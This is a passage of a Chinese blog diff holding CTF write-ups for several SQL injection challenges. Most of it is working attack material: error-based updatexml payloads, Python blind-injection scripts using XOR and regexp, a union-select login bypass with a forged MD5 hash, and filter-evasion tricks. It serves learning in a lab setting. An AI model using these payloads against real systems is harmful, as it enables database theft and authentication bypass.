+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;admin&#39;^updatexml(1,concat(0x7e,(SELECT(database())),0x7e),1)%23&amp;password&#x3D;123</span><br><span class="line"># 返回XPATH syntax error: &#39;~geek~&#39;</span><br></pre></td></tr></table></figure>
+<p>之后操作类似</p>
+<p>执行到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;admin&#39;^updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1)%23&amp;password&#x3D;123</span><br><span class="line"># flag&#123;582fda48-ebec-495e-acda-7</span><br></pre></td></tr></table></figure>
+<p>只出现了一半的flag，而substr被过滤</p>
+<p>根据wp，使用left和right进行拼接操作。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;admin&#39;^updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)),0x7e),1)%23&amp;password&#x3D;123</span><br><span class="line"># 8-ebec-495e-acda-76d8e7055dec&#125;</span><br></pre></td></tr></table></figure>
+<p>也可以使用reverse函数，自然把右半边的显示出来了</p>
+<h1 id="finalsql"><a href="#finalsql" class="headerlink" title="finalsql"></a>finalsql</h1><p>来源：极客大挑战2019</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hello-there/p/13026698.html">https://www.cnblogs.com/hello-there/p/13026698.html</a></p>
+<p>考察：异或注入</p>
+<p>首先Fuzz测试，发现过滤了大部分字段</p>
+<p>其次访问页面中的五个标题，发现URL上会有id字段的变化。而访问[1,6]之外的id值时，会提示ERROR。推理处此处可布尔注入</p>
+<p>由于FUZZ中if被过滤，用异或符^代替if</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;fb37a3d0-7d7e-44ae-8436-df42f39c93a3.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&quot;</span><br><span class="line"></span><br><span class="line">text &#x3D; &quot;Not this!&quot;</span><br><span class="line">ans &#x3D; &quot;&quot;</span><br><span class="line">for i in range(1, 600):</span><br><span class="line">	# print(&quot;debug&quot;)</span><br><span class="line">	low &#x3D; 31</span><br><span class="line">	high &#x3D; 128</span><br><span class="line">	while low &lt; high:</span><br><span class="line">		mid &#x3D; (low + high) &gt;&gt; 1</span><br><span class="line">		# print(c)</span><br><span class="line">		# s &#x3D; &quot;^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i,mid)</span><br><span class="line">		s &#x3D; &quot;^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i,mid)</span><br><span class="line">		# print(s)</span><br><span class="line">		# print(url+s)</span><br><span class="line">		response &#x3D; requests.get(url+s)</span><br><span class="line">		# print(response.text)</span><br><span class="line">		if &quot;ERROR&quot; in response.text:</span><br><span class="line">			low &#x3D; mid + 1</span><br><span class="line">		else:</span><br><span class="line">			high &#x3D; mid</span><br><span class="line">	if low &#x3D;&#x3D; 31 or high &#x3D;&#x3D; 128:</span><br><span class="line">		break</span><br><span class="line">	ans +&#x3D; chr(low)</span><br><span class="line">	print(ans)</span><br><span class="line">print(ans)</span><br><span class="line"></span><br><span class="line"># if(substr(select(flag)from(flag),&#123;&#125;,1)&#x3D;&#123;&#125;,1,2)</span><br><span class="line"></span><br><span class="line">		</span><br></pre></td></tr></table></figure>
+
+
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6103d756-d25b-48b2-bf23-940081a321df&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="BabySQli1"><a href="#BabySQli1" class="headerlink" title="BabySQli1"></a>BabySQli1</h1><p>来源：GXYCTF2019</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/shangguanchanghong/p/13805558.html">https://www.cnblogs.com/shangguanchanghong/p/13805558.html</a></p>
+<p>考察：大小写绕过，后台语句猜测</p>
+<p>Fuzz测试，可以看到admin’提示sql错误，有单引号注入；左括号，右括号，等号，or，ord，order，information_schema.tables，concat_ws，xor等被过滤</p>
+<p>查看网页源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</span><br></pre></td></tr></table></figure>
+<p>根据<a target="_blank" rel="noopener" href="https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#GXYCTF2019-BabysqliV1">https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#GXYCTF2019-BabysqliV1</a><br>base32 只有大写字母和数字数字组成，或者后面有三个等号。<br>base64 只有大写字母和数字，小写字母组成，后面一般是两个等号。<br>明显，那段文字是base32加密</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw&#x3D;&#x3D;</span><br><span class="line">select * from user where username &#x3D; &#39;$name&#39;</span><br></pre></td></tr></table></figure>
+<p>大小写绕过，得到列数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;admin&#39; Or 1 Order by 3 #&amp;pw&#x3D;admin</span><br><span class="line">name&#x3D;admin&#39; Or 1 Order by 4 #&amp;pw&#x3D;admin</span><br></pre></td></tr></table></figure>
+<p>测试name为哪一行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;a&#39; union select &#39;admin&#39;,2,3 #&amp;pw&#x3D;admin</span><br><span class="line">name&#x3D;a&#39; union select 1,&#39;admin&#39;,3 #&amp;pw&#x3D;admin</span><br></pre></td></tr></table></figure>
+<p>第二个提示pass错误，说明admin放在第二行</p>
+<p>注意此处admin需要用单引号括起来，在sql语句中会被解释为字符串，而不是某个列名</p>
+<p>wp说，一般后台都会用md5计算密码hash值并存储，所以猜测后端源码是这样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$name &#x3D; $_POST[&#39;name&#39;];</span><br><span class="line">$passwd &#x3D; md5($_POST[&#39;pw&#39;]);</span><br><span class="line"></span><br><span class="line">$sql &#x3D; &quot;select * from user where username &#x3D; &#39;$name&#39;&quot;;</span><br><span class="line">$query &#x3D; mysql_query($sql);</span><br><span class="line"></span><br><span class="line">if (!strcasecmp($passwd, $query[passwd])) &#123;</span><br><span class="line">	echo $flag;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	echo(&quot;Wrong Pass&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>所以password为pw的值的md5值即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;a&#39; union select 1,&#39;admin&#39;,&#39;21232f297a57a5a743894a0e4a801fc3&#39; #&amp;pw&#x3D;admin</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d69a01fe-e2ac-4330-b89a-d2ff0f6bcac0&#125; </span><br></pre></td></tr></table></figure>
+<h1 id="EasySQL-2"><a href="#EasySQL-2" class="headerlink" title="EasySQL"></a>EasySQL</h1><p>来源：RCTF2015</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#GXYCTF2019-BabysqliV1">https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#GXYCTF2019-BabysqliV1</a></p>
+<p>考察：报错注入，sql的reverse函数，sql的regexp函数</p>
+<p>注册+登录+修改密码，算是模板题</p>
+<p>因为登录后可以显示用户名，初步判断在用户名处注入</p>
+<p>分别注册用户zz’和zz”，zz”在修改密码时报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;zz&quot;&quot; and pwd&#x3D;&#39;c81e728d9d4c2f636f067f89cc14862c&#39;&#39; at line 1</span><br></pre></td></tr></table></figure>
+<p>反过来判断语句大致为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username &#x3D; &quot;zz&quot; and and pwd&#x3D;&#39;c81e728d9d4c2f636f067f89cc14862c&#39; # 后面这个应该是md5值</span><br></pre></td></tr></table></figure>
+<p>那么之后就xpath注入即可</p>
+<p>注意本题过滤了or，substr，多余的空格，异或符^</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;zz&quot;||updatexml(1,concat(0x7e,database(),0x7e),1)#&amp;password&#x3D;2&amp;email&#x3D;2</span><br></pre></td></tr></table></figure>
+<p><del>web_sqli</del></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;zzz&quot;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;&#39;web_sqli&#39;)),0x7e),1)#&amp;password&#x3D;2&amp;email&#x3D;2</span><br></pre></td></tr></table></figure>
+<p><del>article,flag,users</del></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;zzz&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;users&#39;)),0x7e),1)#&amp;password&#x3D;2&amp;email&#x3D;2</span><br></pre></td></tr></table></figure>
+<p>~name,pwd,email,real_flag_1s_her</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;zzz&quot;|(updatexml(1,concat(0x7e,reverse((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;users&#39;))),0x7e),1))#&amp;password&#x3D;2&amp;email&#x3D;2</span><br></pre></td></tr></table></figure>
+<p>‘~ereh_s1_galf_laer,liame,dwp,ema’</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)),0x7e),1))#</span><br></pre></td></tr></table></figure>
+<p>‘~xxx,xxx,xxx,xxx,xxx,xxx,xxx,xxx’</p>
+<p>尝试reverse</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,reverse(concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)),0x7e)),1))#</span><br></pre></td></tr></table></figure>
+<p>‘~xxx,xxx,xxx,xxx,xxx,xxx,xxx,xxx’</p>
+<p>使用regexp进行正则匹配</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;zzz&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)),0x7e),1))#&amp;password&#x3D;2&amp;email&#x3D;2</span><br></pre></td></tr></table></figure>
+<p>‘~flag{8ab20865-f566-4f30-a861-10’</p>
+<p>reverse一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;zzz&quot;||(updatexml(1,reverse(concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)),0x7e)),1))#&amp;password&#x3D;2&amp;email&#x3D;2</span><br></pre></td></tr></table></figure>
+<p>‘~}5cdb11ddaa01-168a-03f4-665f-56’</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8ab20865-f566-4f30-a861-10aadd11bdc5&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h1 id="EzSqli"><a href="#EzSqli" class="headerlink" title="EzSqli"></a>EzSqli</h1><p>来源：GYCTF2020</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/">https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/</a></p>
+<p>寻找点，发现if其实没有被过滤（但是很多wp说被过滤了，后来经查证，字符多了才会被过滤2333）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;if(1&#x3D;1,1,2)</span><br><span class="line">Nu1L</span><br><span class="line">id&#x3D;if(1&#x3D;2,1,2)</span><br><span class="line"># V&amp;N</span><br><span class="line">id&#x3D;if(1&#x3D;1,3,2)</span><br><span class="line"># Error Occured When Fetch Result.</span><br></pre></td></tr></table></figure>
+<p>报错注入得到数据库名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">give_grandpa_pa7pa_pa</span><br></pre></td></tr></table></figure>
+<p>尝试使用information_schema获得表名，无效</p>
+<p>根据wp，使用sys.x$schema_flattened_keys</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x3D; &#39;select group_concat(table_name) from sys.x$schema_flattened_keys&#39;</span><br></pre></td></tr></table></figure>
+<p>或</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()&quot;</span><br></pre></td></tr></table></figure>
+<p>得到表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">users23333333333333,f1ag_1s_h3r3_hhhhh</span><br></pre></td></tr></table></figure>
+<p>接下来使用了字符串大小的判断来编写报错脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import sleep</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;8ec28565-2e76-4246-ba91-4641f78374a6.node3.buuoj.cn&#x2F;index.php&quot;</span><br><span class="line"></span><br><span class="line">text &#x3D; &quot;V&amp;N&quot;</span><br><span class="line">ans &#x3D; &quot;&quot;</span><br><span class="line">payload2 &#x3D; &quot;select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()&quot;</span><br><span class="line">payload3 &#x3D; &quot;(select 1,&#39;&#123;&#125;&#39;)&gt;(select * from f1ag_1s_h3r3_hhhhh)&quot;</span><br><span class="line">for i in range(1, 600):</span><br><span class="line">	# print(&quot;debug&quot;)</span><br><span class="line">	low &#x3D; 32</span><br><span class="line">	high &#x3D; 128</span><br><span class="line">	while low &lt; high:</span><br><span class="line">		mid &#x3D; (low + high) &gt;&gt; 1</span><br><span class="line">		# print(c)</span><br><span class="line">		str_temp &#x3D; ans + chr(mid)</span><br><span class="line"></span><br><span class="line">		payload_temp &#x3D; payload3.format(str_temp)</span><br><span class="line">		post_data &#x3D;&#123;</span><br><span class="line">			&quot;id&quot;: &quot;2||(&#123;&#125;)&quot;.format(payload_temp)</span><br><span class="line">		&#125;</span><br><span class="line">		response &#x3D; requests.post(url, data &#x3D; post_data)</span><br><span class="line">		print(response.text)</span><br><span class="line">		print(mid)</span><br><span class="line">		if text not in response.text:</span><br><span class="line">			high &#x3D; mid</span><br><span class="line">		else:</span><br><span class="line">			low &#x3D; mid + 1</span><br><span class="line">	if low &#x3D;&#x3D; 32 or high &#x3D;&#x3D; 128:</span><br><span class="line">		break</span><br><span class="line">	ans &#x3D; ans + chr(low - 1)</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;9771B2DF-3F20-4E74-A4C6-B73CE4C9DEB9&#125; </span><br></pre></td></tr></table></figure>
+<p>环境好像有些问题，提交不能通过。</p>
+<h2 id="不使用information-schema获得表名的方法"><a href="#不使用information-schema获得表名的方法" class="headerlink" title="不使用information_schema获得表名的方法"></a>不使用information_schema获得表名的方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()</span><br><span class="line">select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure>
+<h2 id="报错注入（无if版本）"><a href="#报错注入（无if版本）" class="headerlink" title="报错注入（无if版本）"></a>报错注入（无if版本）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select &#39;&#123;&#125;&#39;)&gt;(select * from f1ag_1s_h3r3_hhhhh)</span><br></pre></td></tr></table></figure>
+<p>会按照字符串大小来计算</p>
+<h1 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h1><p>来源：NCTF2019</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://guokeya.github.io/post/nctf2019sqliregexp-zhu/">https://guokeya.github.io/post/nctf2019sqliregexp-zhu/</a></p>
+<p>首先进入页面，是一个登录框</p>
+<p>fuzz一下，发现绝大多数的关键字都过滤了</p>
+<p>此处还可以访问robots.txt，进而访问hint.txt，得到过滤黑名单</p>
+<p>根据wp，regexp没过滤，故可构造基于regexp的报错注入语句</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">&quot;http://ee06d8fc-6daa-4c18-ba05-ac4293161510.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line">string = string.ascii_letters+<span class="string">&#x27;_&#x27;</span>+string.digits</span><br><span class="line">text = <span class="string">&quot;welcome.php&quot;</span></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">	<span class="comment"># print(&quot;debug&quot;)</span></span><br><span class="line">	low = <span class="number">32</span></span><br><span class="line">	high = <span class="number">128</span></span><br><span class="line">	flag = <span class="literal">False</span></span><br><span class="line">	<span class="comment"># for j in range(low, high):</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">		<span class="comment"># print(c)</span></span><br><span class="line">		<span class="comment"># time.sleep(0.5)</span></span><br><span class="line">		str_temp = ans + j</span><br><span class="line">		post_data =&#123;</span><br><span class="line">			<span class="string">&quot;username&quot;</span>: <span class="string">&quot;\\&quot;</span>,</span><br><span class="line">			<span class="string">&quot;passwd&quot;</span>: <span class="string">&#x27;||/**/passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(str_temp,parse.unquote(<span class="string">&#x27;%00&#x27;</span>))</span><br><span class="line">		&#125;</span><br><span class="line">		response = requests.post(url, data = post_data)</span><br><span class="line">		<span class="comment"># print(response.text)</span></span><br><span class="line">		<span class="keyword">if</span> text <span class="keyword">in</span> response.text:</span><br><span class="line">			<span class="comment"># print(response.text)</span></span><br><span class="line">			ans = str_temp</span><br><span class="line">			flag = <span class="literal">True</span></span><br><span class="line">			print(ans)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> flag == <span class="literal">False</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p><strong>解释</strong></p>
+<p>其中，关键语句为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;username&quot;: &quot;\\&quot;,</span><br><span class="line">&quot;passwd&quot;: &#39;||&#x2F;**&#x2F;passwd&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&quot;^&#123;&#125;&quot;;&#123;&#125;&#39;.format(str_temp,parse.unquote(&#39;%00&#39;))</span><br></pre></td></tr></table></figure>
+<p>因为对单引号进行了过滤，所以username处添加\，将其后的单引号过滤。且考虑到转译的原因，为”\\“</p>
+<p>而passwd用到了三个知识点，一个是sql的内联注释/**/可以代替空格，一个是regexp的布尔盲注，一个是php中%00的截断（此处python的时候不能直接传入，会被解码为空）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user() regexp &#39;^r&#39; # 从user()中判断是否有以r字母开头的值，有的话返回1</span><br></pre></td></tr></table></figure>
+<p>还有一点需要注意的是，字符只能从_、数字、大小写字母中选取，要是直接以ascii码选取，会选到*，然后报错</p>
+<p>得到密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you_will_never_Know7788990</span><br></pre></td></tr></table></figure>
+<p>将其转换为小写（我也不知道为什么），提交后得到flag</p>
+<h2 id="regexp布尔盲注"><a href="#regexp布尔盲注" class="headerlink" title="regexp布尔盲注"></a>regexp布尔盲注</h2><p>select user() regexp ‘^r’ # 从user()中判断是否有以r字母开头的值，有的话返回1</p>
+<h2 id="单引号注入绕过"><a href="#单引号注入绕过" class="headerlink" title="单引号注入绕过"></a>单引号注入绕过</h2><p>使用\</p>
+<h2 id="php截断"><a href="#php截断" class="headerlink" title="php截断"></a>php截断</h2><p>%00</p>
+<p>有版本限制</p>
+<h1 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h1><p>来源：SWPU2019</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43900387/article/details/103534108">https://blog.csdn.net/weixin_43900387/article/details/103534108</a></p>
+<p>考察：mysql.innodb_table_stats，内联注释绕过空格</p>
+<p>进入页面，有注册页面和登录页面</p>
+<p>在注册页面处尝试进行updatexml的报错注入，由于回显只有登录时才会出现“登录失败”，报错注入较为复杂。尝试多次后，失败。</p>
+<p>随便注册一个用户，进入页面后，有一个输入留言的位置</p>
+<p>尝试在标题和内容都输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;database()</span><br></pre></td></tr></table></figure>
+<p>成功。</p>
+<p>点击查看留言，发现现实sql语句错误，说明标题行是有注入点的</p>
+<p>麻烦的是此处用burp跑fuzz比较麻烦，且过滤了order by，行数特别多</p>
+<p>看wp</p>
+<p>爆列数，注意最后一个数22的单引号，用于闭合右单引号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,user(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure>
+<p>报数据库类型</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure>
+<p>是mariaDB-log，它的mysql.innodb_table和mysq中的information_table.schema作用一样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure>
+<p>得到表名，然后抽取表值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+<h2 id="绕过单引号的方法"><a href="#绕过单引号的方法" class="headerlink" title="绕过单引号的方法"></a>绕过单引号的方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,&#39;22</span><br></pre></td></tr></table></figure>
+<h2 id="maria-db下的“information-schema”"><a href="#maria-db下的“information-schema”" class="headerlink" title="maria_db下的“information_schema”"></a>maria_db下的“information_schema”</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql.innodb_table_stats</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h1><p>来源：BJDCTF 2nd</p>
